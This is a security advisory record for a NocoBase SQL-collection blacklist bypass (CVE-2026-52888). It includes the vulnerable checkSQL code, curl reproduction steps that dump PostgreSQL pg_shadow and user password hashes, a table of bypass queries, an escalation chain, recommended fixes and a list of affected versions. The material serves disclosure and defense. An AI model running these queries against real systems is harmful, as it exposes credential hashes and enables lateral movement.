@@ -1,0 +1,1194 @@
+advisory_id: GHSA-v8vm-cqh8-q87q
+datasource_id: github_osv/GHSA-v8vm-cqh8-q87q
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v8vm-cqh8-q87q/GHSA-v8vm-cqh8-q87q.json
+aliases:
+  - CVE-2026-52888
+summary: |
+  NocoBase: Sensitive Data Exposure via SQL Blacklist Bypass
+  # Security Vulnerability Report: Sensitive Data Exposure via SQL Blacklist Bypass
+
+  ## Summary
+
+  The `checkSQL()` function in `plugin-collection-sql` implements a **keyword-based blacklist** to prevent dangerous SQL queries from being executed through the SQL Collection feature. However, the blacklist is **incomplete**: it only checks for a subset of dangerous PostgreSQL system functions and **does not restrict access to sensitive system catalog tables** such as `pg_shadow`, `pg_roles`, or `pg_stat_activity`.
+
+  An authenticated user with the `admin` role can exploit this to **dump PostgreSQL password hashes** (`pg_shadow`), **read all NocoBase user credentials** (hashed passwords from the `users` table), and **enumerate the full database schema** — all data that admin users should never be able to access through the application interface.
+
+  ---
+
+  ## Affected Component
+
+  **File**: `packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts`
+
+  ```typescript
+  export const checkSQL = (sql: string) => {
+    const dangerKeywords = [
+      // PostgreSQL — BLOCKED
+      'pg_read_file',
+      'pg_read_binary_file',
+      'pg_stat_file',
+      'pg_ls_dir',
+      'pg_logdir_ls',
+      'pg_terminate_backend',
+      'pg_cancel_backend',
+      'current_setting',
+      'set_config',
+      'pg_reload_conf',
+      'pg_sleep',
+      'generate_series',
+
+      // MySQL — BLOCKED
+      'LOAD_FILE',
+      'BENCHMARK',
+      '@@global.',
+      '@@session.',
+
+      // SQLite — BLOCKED
+      'sqlite3_load_extension',
+      'load_extension',
+    ];
+
+    // NOT BLOCKED: pg_shadow, pg_roles, pg_stat_activity,
+    //                 information_schema, users table direct access, etc.
+
+    sql = sql.trim().split(';').shift();
+    if (!/^select/i.test(sql) && !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
+      throw new Error('Only supports SELECT statements or WITH clauses');
+    }
+    if (dangerKeywords.some((keyword) => sql.toLowerCase().includes(keyword.toLowerCase()))) {
+      throw new Error('SQL statements contain dangerous keywords');
+    }
+  };
+  ```
+
+  The `execute` action in `sql.ts` passes user-supplied SQL directly through this insufficient check:
+
+  ```typescript
+  // sql.ts — execute action
+  execute: async (ctx: Context, next: Next) => {
+    const { sql } = ctx.action.params.values || {};
+    try {
+      checkSQL(sql);         // ← insufficient validation
+    } catch (e) {
+      ctx.throw(400, ctx.t(e.message));
+    }
+    // SQL is executed directly against the database
+    const data = await model.findAll({ attributes: ['*'], limit: 5, raw: true });
+    ctx.body = { data, fields, sources };
+  }
+  ```
+
+  ---
+
+  ## Root Cause
+
+  The blacklist approach is **fundamentally incomplete**. It attempts to enumerate every dangerous construct but misses entire categories:
+
+  1. **PostgreSQL system catalog tables** — `pg_shadow`, `pg_authid`, `pg_roles`, `pg_stat_activity` are not restricted
+  2. **Application-level sensitive tables** — `users` (containing hashed passwords) can be queried directly
+  3. **`information_schema`** — full schema enumeration is possible
+  4. **Schema-qualified variants** — even some blocked functions could be bypassed via `pg_catalog.` prefix (e.g. `pg_catalog.pg_read_file` may bypass checks in older versions)
+
+  The correct approach is an **allowlist** (whitelist) of permitted tables/schemas, not a blacklist of forbidden keywords.
+
+  ---
+
+  ## Steps to Reproduce
+
+  **Prerequisites**: A user account with the `admin` role (has the `pm.data-source-manager.collection-sql` ACL snippet).
+
+  **Step 1**: Authenticate and obtain a token:
+  ```bash
+  TOKEN=$(curl -s -X POST http://<TARGET>/api/auth:signIn \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@example.com","password":"<password>"}' \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
+  ```
+
+  **Step 2**: Dump PostgreSQL password hashes from `pg_shadow`:
+  ```bash
+  curl -s -X POST http://<TARGET>/api/sqlCollection:execute \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"sql":"SELECT usename, passwd FROM pg_shadow LIMIT 10"}'
+  ```
+
+  **Response**:
+  ```json
+  {
+    "data": {
+      "data": [
+        {
+          "usename": "nocobase",
+          "passwd": "SCRAM-SHA-256$4096:wmmGvfjPHRDsnzjOfHCmUQ==$fAXKBU7y3Ymmgg0iq6ibc66fN+v3Q7FaX86RgxP0tTY=:enn2dRiXhUQ2N5o4bRtZLNB3B8FpAdKC8Cp3HZ/hSFU="
+        }
+      ]
+    }
+  }
+  ```
+
+  **Step 3**: Dump NocoBase user credentials:
+  ```bash
+  curl -s -X POST http://<TARGET>/api/sqlCollection:execute \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"sql":"SELECT id, email, username, password FROM users LIMIT 100"}'
+  ```
+
+  **Response** (verified):
+  ```json
+  {
+    "data": {
+      "data": [
+        {
+          "id": 1,
+          "email": "admin@nocobase.com",
+          "username": "nocobase",
+          "password": "1afc4721f320c4e097ac4aaca33544e7dadcc8cd7d57d40240f987bdbcbc686b"
+        }
+      ]
+    }
+  }
+  ```
+
+  ---
+
+  ## Additional Verified Bypass Queries
+
+  | Query | Blocked? | Data Exposed |
+  |-------|----------|--------------|
+  | `SELECT usename, passwd FROM pg_shadow` |**Not blocked** | PostgreSQL DB user password hashes |
+  | `SELECT id, email, password FROM users` |**Not blocked** | All NocoBase user credential hashes |
+  | `SELECT table_name FROM information_schema.tables` |**Not blocked** | Full database schema enumeration |
+  | `SELECT rolname, rolsuper FROM pg_roles` |**Not blocked** | All DB roles and superuser flags |
+  | `SELECT pid, query FROM pg_stat_activity` |**Not blocked** | Live SQL queries from all sessions |
+  | `SELECT pg_read_file('/etc/passwd')` |Blocked | — |
+  | `SELECT current_setting('app.key')` |Blocked | — |
+
+  ---
+
+  ## Why Admin-Required Still Matters
+
+  This vulnerability is rated **High** despite requiring admin-level authentication. The reasoning:
+
+  ### 1. Security Boundary Violation (Scope Changed → S:C)
+  The `admin` role in NocoBase is an **application-level** role — it manages workflows, collections, and UI. It is **not** a database administrator. Accessing `pg_shadow` is a **PostgreSQL system-level** privilege that admins should never have. The `checkSQL()` function was explicitly created to enforce this boundary; bypassing it breaks the intended security model.
+
+  ### 2. Data That Admin Cannot Access Through Normal UI
+  Even with admin privileges, NocoBase's UI and API **do not expose**:
+  - `pg_shadow` (PostgreSQL internal password store)
+  - Raw `users.password` hashes via standard API responses
+  - Full `information_schema` enumeration
+
+  VUL-2 grants access to all of the above — data the application explicitly chose not to expose.
+
+  ### 3. Enables Lateral Movement
+  The `pg_shadow` SCRAM-SHA-256 hashes can be subjected to offline dictionary attacks. If cracked, the attacker gains **direct PostgreSQL access** with the application's DB credentials — bypassing the NocoBase application layer entirely. This enables reading **all data** in the database (not just what NocoBase exposes), modifying records directly, and accessing data from other schemas.
+
+  ### 4. Enables Full Attack Chain When Combined with Other Vulnerabilities
+  ```
+  Member user (lowest privilege)
+    → VUL-8: Trigger a pre-built RCE workflow (any logged-in user can trigger)
+    → VUL-1: RCE reads APP_KEY from process.env
+    → Forge JWT with admin role
+    → VUL-2: Dump pg_shadow + users.password
+    → Crack hashes → full PostgreSQL access
+  ```
+
+  ---
+
+  ## Impacted API Endpoint
+
+  ```
+  POST /api/sqlCollection:execute
+  ```
+
+  - **Authentication**: Required (`admin` role)
+  - **ACL Snippet** registered in `plugin.ts`:
+    ```typescript
+    this.app.acl.registerSnippet({
+      name: `pm.data-source-manager.collection-sql`,
+      actions: ['sqlCollection:*'],   // includes :execute
+    });
+    ```
+  - The `admin` role includes this snippet by default.
+
+  ---
+
+  ## Recommended Fixes
+
+  ### Fix 1 (Immediate): Extend the blacklist with system catalog tables
+  ```typescript
+  const dangerKeywords = [
+    // ... existing entries ...
+
+    // ADD: PostgreSQL system catalog tables with sensitive data
+    'pg_shadow',
+    'pg_authid',
+    'pg_auth_members',
+    'pg_stat_activity',
+    'pg_roles',
+    // Note: information_schema should also be restricted for non-DBA roles
+  ];
+  ```
+
+  ### Fix 2 (Recommended): Replace blacklist with schema allowlist
+  Instead of blocking dangerous keywords, only allow queries against **user-defined collection tables**:
+
+  ```typescript
+  // Allowlist approach: extract table names from AST and verify against known collections
+  const allowedTables = await db.getCollectionNames(); // tables created by NocoBase users
+  const referencedTables = extractTableNames(parsedSQL);
+  if (!referencedTables.every(t => allowedTables.includes(t))) {
+    throw new Error('Query references tables outside the allowed scope');
+  }
+  ```
+
+  ### Fix 3 (Defense-in-depth): Use a read-only, restricted DB user
+  The application's DB connection should use a PostgreSQL user that:
+  - Does **not** have `SELECT` privilege on `pg_shadow` or `pg_authid`
+  - Only has access to the application's own schema (`nocobase` schema)
+
+  This ensures that even if the blacklist is bypassed, the DB user cannot access system catalogs.
+
+  ---
+
+  ## Environment
+
+  | Field | Value |
+  |-------|-------|
+  | NocoBase version | 2.0.59-full |
+  | Database | PostgreSQL 16.14 |
+  | Deployment | Docker (`nocobase/nocobase:2.0.59-full`) |
+  | Vulnerable file | `plugin-collection-sql/src/server/utils.ts` — `checkSQL()` |
+  | Vulnerable endpoint | `POST /api/sqlCollection:execute` |
+  | Auth required | Admin role (`pm.data-source-manager.collection-sql` snippet) |
+
+  ---
+
+  ## Timeline
+
+  | Date | Event |
+  |------|-------|
+  | 2026-05-29 | Vulnerability discovered via whitebox source code audit of `utils.ts` |
+  | 2026-05-29 | Exploit verified on live Docker instance — `pg_shadow` and `users.password` dumped |
+  | 2026-05-29 | Report submitted to maintainers |
+
+  ---
+  ## Script and video PoC:
+  [poc_vul2_sqli.py](https://github.com/user-attachments/files/28380402/poc_vul2_sqli.py)
+
+  https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732
+impacted_packages:
+  - purl: pkg:npm/%40nocobase/plugin-collection-sql
+    affected_versions: vers:npm/<2.0.62
+    fixed_versions: vers:npm/2.0.62
+    affected_packages:
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.0.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.0.0-alpha.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.0.0-alpha.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.0.1-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.0.1-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.0.1-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.0-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.1-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.2-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.3-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.4-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.5-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.6-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.7-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.8-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.9-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.10-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.11-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.12-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.13-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.14-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.15-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.16-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.17-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.19-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.20-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.21-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.22-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.23-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.24-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.25-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.26-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.27-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.28-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.29-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.30-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.32-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.33-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.34-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.35-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.36-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.37-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.38-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.2.39-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240710084543
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240710141659
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240710155619
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240719150832
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240721030922
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240724142600
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240806102951
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240807100243
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240814073548
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-alpha.20240819011229
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.0-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.1-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.2-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.3-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.4-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.5-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.6-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.7-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.8-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.9-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.10-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.11-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.12-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.13-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.14-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.15-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.16-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.17-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.18-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.19-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.20-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.21-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.22-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.23-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.24-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.25-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.26-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.27-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.28-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.29-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.30-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.31-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.32-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.33-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.34-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.35-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.36-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.37-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.38-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.39-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.40-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.41-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.42-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.43-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.44-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.45-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.46-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.47-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.48-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.49-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.50-beta
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.51
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.52
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.53
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.54
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.3.55
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240825165425
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240826214041
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240826225858
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240827104423
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240828033319
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240902021325
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240902071446
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240902080620
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240902083444
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240903050434
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240903052847
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240903083725
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240906114411
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240906133133
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240910145333
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240911231734
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240914084300
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240914095808
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240914235554
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240918085507
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240919174335
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240923152933
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240928155737
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240929231156
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240930005110
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240930031045
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20240930160619
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241008122235
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241011073807
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241016035453
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241016084738
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241017164316
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241020025811
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241020033334
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241023053303
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241024133132
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241024151311
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241025010959
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241027230531
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241031134640
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241104151643
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241105010837
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241105053324
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-alpha.20241105230315
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.4.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0-beta.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.5
